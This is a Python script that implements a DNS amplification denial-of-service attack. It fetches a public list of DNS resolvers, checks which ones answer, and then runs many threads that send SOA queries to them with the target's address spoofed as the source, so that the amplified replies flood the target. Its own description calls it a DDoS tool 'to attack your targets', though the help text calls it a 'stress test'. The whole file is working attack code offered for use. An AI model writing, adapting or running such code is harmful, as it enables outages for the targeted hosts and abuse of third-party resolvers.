import argparse
import socket
import sys
import signal
import wget
import os
import time

from threading import Thread
from scapy.all import *
from pathlib import Path

parser = argparse.ArgumentParser (
    description="DNS Amplification DDOS: Use Spoofable DNS servers to attack your targets"
)

parser.add_argument("host", nargs="?", help="Target host to perform stress test on")
parser.add_argument("-p", "--port", default=80, help="Port to test (80, 443, etc)", type=int)
parser.add_argument("-t", "--threads", default=100, help="Max number of threads/servers to use", type=int)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Target host required!")
    parser.print_help()
    sys.exit(1)

dns_list = []
threadRun = True
threadCount = 0

def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

def getDNSServers():
    global maxThreads
    global threadCount

    print('Downloading dns server list...' )
    url = 'https://public-dns.info/nameservers.txt'
    filename = 'nameservers.txt'

    if (Path(filename).is_file()):
        os.remove(filename)

    wget.download(url)

    print('\r\nLoading list into memory...')
    with open(filename) as file:
        dns_list = [line.rstrip() for line in file]

    for i in dns_list:
        if maxThreads > threadCount:
            if (validate_ip(i)):
                if (testDNSServer(i)):
                    addThread()
                    _ = Thread(target=initiateAttack, args=(i,)).start()
        else:
            break

def testDNSServer(ip):
    try:
        dns_request = IP(dst=str(ip)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='google.com', qtype='SOA'))
        response = sr(dns_request, timeout=0.5, verbose=False)

        if ('UDP:1' in str(response[0])):
            #print("Adding " + str(ip) + " to slaves")
            return True
        
        if ('UDP:1' in str(response[1])):
            return False

    except socket.error as e:
        print("Socket: ", e)
        return False
    except Exception as e:
        print("Exception: ", e)
        return False

def initiateAttack(ip):
    while (threadRun):
        try:
            dns_request = IP(dst=str(ip), src=str(args.host)) / UDP(dport=53, sport=int(args.port)) / DNS(rd=1, qd=DNSQR(qname='google.com', qtype='SOA'))
            _ = srp1(dns_request, timeout=0, verbose=False)
        except socket.error as e:
            subThread()
            break
        except Exception as e:
            subThread()
            break

        time.sleep(0.5)
        
def signal_event_exit(signal, frame):
    global threadRun
    threadRun = False
    sys.exit(0)

def addThread():
    global threadCount
    threadCount = threadCount + 1

def subThread():
    global threadCount
    threadCount = threadCount - 1

def threadUpdate():
    global threadCount
    while (threadRun):
        time.sleep(5)
        print("Attack running... current slaves: ", threadCount)

if __name__ == "__main__":
    global maxThreads
    maxThreads = args.threads
    
    signal.signal(signal.SIGINT, signal_event_exit)
    
    _ = Thread(target=threadUpdate, args=()).start()
    
    getDNSServers()
    
    while True:
        try:
            time.sleep(0.25)
        except (KeyboardInterrupt, SystemExit):
            print("Stopping attack")
            break
        time.sleep(0.25)